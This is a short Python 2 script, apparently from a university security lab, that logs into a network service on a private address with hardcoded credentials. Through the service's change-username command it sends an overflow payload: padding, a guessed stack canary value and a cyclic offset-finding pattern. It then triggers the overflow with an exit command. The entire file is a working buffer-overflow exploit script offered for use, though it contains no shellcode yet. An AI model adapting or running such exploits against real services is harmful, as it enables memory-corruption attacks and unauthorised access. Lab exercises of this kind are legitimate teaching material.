import socket
import time

canaries = '\x01\x01\x01\x01'
login = 'cs19m050:cs19m050' + '\n'
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
exit = 'e' + '\n'

buffer = 'A' * 128 + canaries + pattern

IP_FH = '10.105.21.174'
IP_MARTIN = '10.0.2.22'
IP = IP_FH
PORT = 8080
BUFFER_SIZE = 2048

# connection establishment
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))

# login to the application
s.send(login)
res2 = s.recv(BUFFER_SIZE)
print (res2)

time.sleep(0.02)

# sending buffer to change username vulnerability
s.send('u ' + buffer + '\n')
res3 = s.recv(BUFFER_SIZE)

# sending cmd which should be executed
s.send(exit)

#response of cmd
res4 = s.recv(BUFFER_SIZE)
print "Response: " + res4

s.close()